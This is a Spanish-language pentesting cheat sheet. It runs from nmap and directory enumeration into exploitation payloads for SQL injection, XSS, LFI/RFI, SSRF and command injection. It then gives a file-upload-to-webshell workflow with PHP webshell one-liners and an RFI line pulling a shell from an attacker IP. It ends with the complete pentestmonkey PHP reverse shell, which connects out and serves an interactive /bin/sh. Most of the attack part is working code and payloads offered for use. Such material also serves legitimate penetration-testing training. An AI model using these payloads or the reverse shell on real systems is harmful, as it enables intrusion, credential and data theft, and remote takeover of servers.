##### **Reconocimiento Pasivo**
**OSINT (Open-Source Intelligence):**
**whois:** `whois <dominio>` - Información de registro del dominio.
 **dig:** `dig <dominio> ANY` - Consulta registros DNS (A, MX, NS, TXT, etc.).
 **nslookup:** `nslookup <dominio>` - Alternativa para consultas DNS.
 **theHarvester:** `theharvester -d <dominio> -b google,bing,linkedin` - Recopila emails, subdominios, hosts, etc.
**Sublist3r / Amass / Subfinder:** `sublist3r -d <dominio> -o subdominios.txt` - Enumeración de subdominios.
**Shodan / Censys / Google Dorks:** Buscar infraestructura expuesta, paneles de administración, archivos sensibles (`site:ejemplo.com filetype:pdf`).

##**1. Reconocimiento y Escaneo de Puertos (NMAP)**

**Escaneo TCP  y Completo:**

```
nmap -p- --open -n -vvv <IP>
```

```
nmap -sC -sV -p22,80 -vvv -n <IP>
```

```
nmap -sV --script vuln -p22,80,443 <IP>
```


**Escaneo UDP:**

```
nmap -sU <IP>
```

**Scripts NSE por Servicio:**

**HTTP / HTTPS (80, 443, 8080...):**
   # Enumeración básica de directorios, títulos, métodos y cabeceras.
   
```
   nmap --script=http-enum,http-title,http-methods,http-server-header,http-robots.txt -p80,443 <IP>
```
  
  # Búsqueda de vulnerabilidades comunes y específicas (SQLi, Shellshock, etc.).
```
   nmap --script=http-vuln*,http-sql-injection,http-shellshock,http-apache-server-status -p80,443 <IP>
```

 
**WordPress:**
# Enumeración de usuarios, plugins y temas de WordPress.

```
nmap --script=http-wordpress-enum -p80,443 <IP>
```

**SSH (22):**

Enumeración de algoritmos, claves de host y métodos de autenticación.
```
nmap --script=ssh2-enum-algos,ssh-hostkey,ssh-auth-methods -p22 <IP>
```

**FTP (21):**
# Comprobar acceso anónimo, versión del sistema y buscar backdoors conocidos.

```
nmap --script=ftp-anon,ftp-syst,ftp-libopie,ftp-vsftpd-backdoor,ftp-proftpd-backdoor -p21 <IP>
```

**MySQL / Databases (3306, 5432…):**

Enumeración de información de MySQL y búsqueda de vulnerabilidades.
```
nmap --script=mysql-enum,mysql-info,mysql-vuln-cve2012-2122 -p3306 <IP>
```

**SNMP (161 UDP):**

Obtener información del sistema y fuerza bruta de community strings.

```
nmap --script=snmp-info,snmp-brute -p161 -sU <IP>
```

 **NTP (123 UDP):**

Obtener información del servidor NTP y comprobar monlist (amplificación DDoS).

```
nmap --script=ntp-info,ntp-monlist -p123 -sU <IP>
```

Identifica tecnologías, servidor web, plugins, etc.

```
whatweb http://<IP>

```

**2. Enumeración Web (Fuerza Bruta de Directorios y Archivos)**

**Herramientas:**

**GOBUSTER:**

  # Búsqueda de directorios y archivos comunes.
  
```
 gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```
 
 # Búsqueda de directorios y archivos con extensiones específicas, excluyendo códigos 404.
 
```
 gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,txt,bak,old,js,css,json,sql,db,log,conf,ini,backup,swp,tar,gz,zip,rar,xml,yaml,yml -b 404
```

**DIRSEARCH:**

```
dirsearch -u http://<IP>/ -e php,html,txt
```

# Búsqueda avanzada con wordlist personalizada, múltiples extensiones, recursividad y cookies.

```
dirsearch -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e php,html,txt,bak,old,js,css,json,sql,db,log,conf,ini,backup,swp,tar,gz,zip,rar,xml,yaml,yml --recursion --cookie="auth=1"
```
 

 **DirBuster (Interfaz Gráfica):**
 
 Añadir las siguientes extensiones.`php,html,txt,bak,old,js,css,json,sql,db,log,conf,ini,backup,swp,tar,gz,zip,rar,xml,yaml,yml`

 **Análisis de Tecnologías:**
**Wappalyzer:** Extensión de navegador para identificar el stack tecnológico.
**Nikto:** `nikto -h http://<IP>` Escaneo  de vulnerabilidades web conocidas.

**CMS (Content Management System):**
**WordPress:**
 `wpscan --url http://<IP> --enumerate u,vp,tt` - Enumera usuarios, plugins vulnerables y temas.
 
 `wpscan --url http://<IP> --passwords /ruta/a/wordlist.txt` - Fuerza bruta contra usuarios.
 
- **Joomla:** `joomscan -u http://<IP>`
#### **Fase 3: Explotación (Gaining Access)**
#### **Inyección SQL (SQLi)**

-**Herramienta Automatizada: SQLMap**
  
 **Detección y Enumeración Básica:**
  `sqlmap -u "http://<IP>/vuln.php?id=1" --batch --dbs`
  `-u`: URL objetivo. `--batch`: Modo no interactivo. `--dbs`: Enumera todas las bases de datos.
  **Enumeración de Tablas y Columnas:**
  `sqlmap -u "http://<IP>/vuln.php?id=1" --batch -D <nombre_db> -T <nombre_tabla> --columns`
 `-D`: Base de datos. `-T`: Tabla. `--columns`: Enumera columnas.
 **Volcado de Datos (Dump):**
`sqlmap -u "http://<IP>/vuln.php?id=1" --batch -D <nombre_db> -T <users> -C username,password --dump`
`-C`: Columnas específicas. `--dump`: Extrae los datos.
**Obtener una Shell Interactiva:**
`sqlmap -u "http://<IP>/vuln.php?id=1" --batch --os-shell`
Intenta subir un web shell y darte una terminal interactiva.
**Payloads y Técnicas Manuales (para bypass de WAFs y entendimiento):**

**Detección de Inyección:**
`'` (comilla simple), `"` (comilla doble), `\` (barra invertida). Provocan un error si no se sanitizan.
**Login Bypass:**
`admin' --` (comenta el resto de la consulta).
`admin' OR '1'='1' --` (condición siempre verdadera).
`admin' OR 1=1#` (alternativa con `#` para MySQL).
**Inyección UNION (para extraer datos):**
`' UNION SELECT 1,2,3,4 --` (determina el número de columnas hasta que no de error).
`' UNION SELECT null, table_name, null, null FROM information_schema.tables --` (enumera tablas en MySQL).
`' UNION SELECT null, column_name, null, null FROM information_schema.columns WHERE table_name='users' --` (enumera columnas de la tabla 'users').
`' UNION SELECT null, username, password, null FROM users --` (extrae datos de las columnas 'username' y 'password').
**Inyección Ciega (Blind SQLi):**
**Basada en Tiempo:** `1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) --` (si la app tarda 5s, es vulnerable).
**Basada en Contenido:** `1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'), 1, 1)='a' --` (adivina el primer carácter de la contraseña letra por letra).

#### **Cross-Site Scripting (XSS)**

El objetivo de XSS es inyectar código JavaScript (u otro código del lado del cliente) en una página web para que se ejecute en el navegador de otros usuarios. Esto permite robar cookies, sesiones, credenciales, o realizar acciones en nombre de la víctima.

**Herramienta Automatizada: XSStrike**

XSStrike es una herramienta potente que no solo encuentra XSS, sino que también genera payloads para bypass filtros (WAFs).
**Escaneo Básico:**

```
python3 xsstrike.py -u "http://<IP>/search.php?q=test"
```
 

`-u`: Especifica la URL objetivo con un parámetro a probar.
**Escaneo con POST Data:**

```
python3 xsstrike.py -u "http://<IP>/login.php" -d "user=test&pass=test"
```


 `-d`: Especifica los datos del cuerpo de la petición POST.
-**Crawl y Escaneo:**


```
python3 xsstrike.py -u "http://<IP>" --crawl
```

`--crawl`: Hará que la herramienta explore el sitio web en busca de más parámetros para testear.

**Payloads y Técnicas Manuales (para bypass y entendimiento):**

**Detección Rápida (Reflected XSS):**
Inyecta una cadena simple para ver si se refleja en el código fuente de la página.
`test1234` -> Busca `test1234` en el HTML de la respuesta.
`<h1>test</h1>` -> Busca si la etiqueta se interpreta.
 **Payloads de Prueba (Confirmación):**
**Script básico:** `<script>alert('XSS')</script>`
**Desde un atributo:** `"><script>alert('XSS')</script>` (para salir de un atributo HTML, como `value=""`).
**En un tag de imagen:** `<img src=x onerror=alert('XSS')>`
**Usando JavaScript pseudo-protocolo:** `javascript:alert('XSS')`

#### **Remote/Local File Inclusion (RFI/LFI)**
**Payloads y Técnicas Manuales:**

**LFI - Path Traversal Básico:**
`?page=../../../../etc/passwd`
`?page=../../../../windows/system32/drivers/etc/hosts`
**LFI - Bypass de Filtros:**
**Filtro `../`:** `..%2f` (URL encode), `....//` (doble barra), `/var/www/html/../../etc/passwd` (ruta absoluta).
**Filtro `etc/passwd`:** `?page=../../../../etc/passwd%00` (null byte, en PHP <5.3.4).
**Wrapper PHP para leer código fuente:** `?page=php://filter/read=convert.base64-encode/resource=config.php` (devuelve el código fuente de `config.php` en Base64).
**RFI - Ejecución de Código Remoto:**
**Requisito:** `allow_url_include=On` en `php.ini`.
**Payload:** `?page=http://<IP_ATAcante>/shell.txt`
**Contenido de `shell.txt`:** `<?php system($_GET['cmd']); ?>`
**Uso:** `http://<IP_VICTIMA>/vuln.php?page=http://<IP_ATAcante>/shell.txt&cmd=whoami`

#### **Server-Side Request Forgery (SSRF)**

**Herramienta Automatizada: SSRFmap**
 
SSRFmap automatiza el proceso de encontrar y explotar SSRF.
**Guarda la petición en un archivo:** Primero, intercepta una petición con Burp Suite y guárdala como `request.txt`.
**Escaneo Básico:**


```
python3 ssrfmap.py -r request.txt
```


**Escanear un parámetro específico:**


```
python3 ssrfmap.py -r request.txt -p "url"
```

  
`-p`: Especifica el parámetro que crees que es vulnerable.
**Usar un módulo específico (ej: para escanear la red interna):**

```

python3 ssrfmap.py -r request.txt -m portscan
```

`-m`: Especifica el módulo (`portscan`, `readfiles`, `alibaba`, `aws`, etc.).
- **Payloads y Técnicas Manuales:**

**Detección Básica (Forzar una petición a un servidor controlado):**
**Requisito:** Debes tener un servidor web escuchando y revisando sus logs (`tail -f /var/log/apache2/access.log`).
**Payload:** `?url=http://<IP_ATAcANTE>/`
Si ves una petición desde la IP del servidor víctima en tus logs, has confirmado el SSRF.
**Payloads para Acceder a Recursos Internos:**
**Acceso a localhost/127.0.0.1:**
`?url=http://localhost:80` (para acceder al panel de admin local si existe).
 **Leer Archivos Locales (si el protocolo `file://` está permitido):**
`?url=file:///etc/passwd` (Linux).
`?url=file:///C:/windows/system32/drivers/etc/hosts` (Windows).
 **Escaneo de Puertos Internas (usando el protocolo `dict://`):**
`?url=dict://127.0.0.1:22/` (Si responde, el puerto 22 está abierto).
 `?url=dict://127.0.0.1:6379/` (Para testear Redis).

#### **Command Injection**

**Payloads y Técnicas Manuales:**
 **Payloads de Prueba (se inyectan en el parámetro vulnerable):**
`;` (ejecuta el siguiente comando): `8.8.8.8; whoami`
`|` (pipe, la salida del primero es la entrada del segundo): `8.8.8.8 | whoami`
`&` (ejecuta en segundo plano): `8.8.8.8 & whoami`
`&&` (ejecuta si el primero tiene éxito): `8.8.8.8 && whoami`
`` ` `` (comando sustituto): `8.8.8.8` `whoami``
**Técnicas de Evasión (Bypass):**
**Comentarios:** `8.8.8.8;ls#` o `8.8.8.8|ls||`
**Cotización:** `8.8.8.8"; ls; "`
**Variables de entorno:** `$HOME` o `${HOME}` en lugar de `/root`.
**Metodología de Ataque: File Upload a WebShell**

**Flujo de Trabajo con Burp Suite:**

 **Configurar Proxy:** Pon tu navegador (Firefox/Chrome) para que use el proxy de Burp Suite (`127.0.0.1:8080`).
**Capturar la Petición:** Navega hasta el formulario de subida de archivos y sube un archivo cualquiera (ej: `test.txt`) para capturar la petición `POST` en el "HTTP History" de Burp.
**Analizar la Petición:** Revisa los puntos clave:
  Nombre del parámetro del archivo (ej: `file`, `upload`, `image`).
 `Content-Type` del archivo (ej: `text/plain`).
 Posibles filtros de extensión en la respuesta del servidor.
  La respuesta del servidor a veces revela la ruta donde se guardó el archivo.
**Enviar a Repeater:** Envía la petición capturada a la pestaña "Repeater" para manipularla.
 **Manipular y Enviar:**
  **Cambia el nombre del archivo:** Prueba con `shell.php`, `shell.php.jpg`, `shell.phtml`, `shell.png.php`.
 **Cambia el `Content-Type`:** Modifícalo a `image/jpeg` o `image/png` para intentar bypassear filtros de tipo MIME.
  **Prueba doble extensión:** `shell.php.png`.
Guarda las peticiones que funcionen para analizar la respuesta.
 **Encontrar el Archivo Subido:**
Si el servidor indica la ruta (ej: `File uploaded to /uploads/shell.php`), úsala directamente.
Si no, fuzzea las rutas comunes: `/uploads/`, `/files/`, `/media/`, `/documents/`, `/images/`, `/temp/`, `/upload/`, `/content/`.

**Subir y Ejecutar WebShell:**

**Crea el WebShell:** Usa un archivo PHP simple para ejecutar comandos.
  
```php
<?php system($_REQUEST['cmd']); ?>
```

O una versión más robusta:

php

```php
   <?php echo "<pre>" . shell_exec($_REQUEST['cmd']) . "</pre>"; ?>
   ```
  
**Sube el Archivo:** Usa el formulario de subida y las técnicas de bypass descritas arriba para subir tu shell.php`.

**RevShell**

```
<?php
// php-reverse-shell - A Reverse Shell implementation in PHP
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  The author accepts no liability
// for damage caused by this tool.  If these terms are not acceptable to you, then
// do not use this tool.
//
// In all other respects the GPL version 2 applies:
//
// This program is free software; you can redistribute it and/or modify
// it under the terms of the GNU General Public License version 2 as
// published by the Free Software Foundation.
//
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License along
// with this program; if not, write to the Free Software Foundation, Inc.,
// 51 Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
//
// This tool may be used for legal purposes only.  Users take full responsibility
// for any actions performed using this tool.  If these terms are not acceptable to
// you, then do not use this tool.
//
// You are encouraged to send comments, improvements or suggestions to
// me at pentestmonkey@pentestmonkey.net
//
// Description
// -----------
// This script will make an outbound TCP connection to a hardcoded IP and port.
// The recipient will be given a shell running as the current user (apache normally).
//
// Limitations
// -----------
// proc_open and stream_set_blocking require PHP version 4.3+, or 5+
// Use of stream_select() on file descriptors returned by proc_open() will fail and return FALSE under Windows.
// Some compile-time options are needed for daemonisation (like pcntl, posix).  These are rarely available.
//
// Usage
// -----
// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.

set_time_limit (0);
$VERSION = "1.0";
$ip = '127.0.0.1';  // CHANGE THIS
$port = 1234;       // CHANGE THIS
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;

//
// Daemonise ourself if possible to avoid zombies later
//

// pcntl_fork is hardly ever available, but will allow us to daemonise
// our php process and avoid zombies.  Worth a try...
if (function_exists('pcntl_fork')) {
	// Fork and have the parent process exit
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	// Make the current process a session leader
	// Will only succeed if we forked
	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

// Change to a safe directory
chdir("/");

// Remove any umask we inherited
umask(0);

//
// Do the reverse shell...
//

// Open reverse connection
$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

// Spawn shell process
$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

// Set everything to non-blocking
// Reason: Occsionally reads will block, even though stream_select tells us they won't
stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

// Like print, but does nothing if we've daemonised ourself
// (I can't figure out how to redirect STDOUT like a proper daemon)
function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 
```


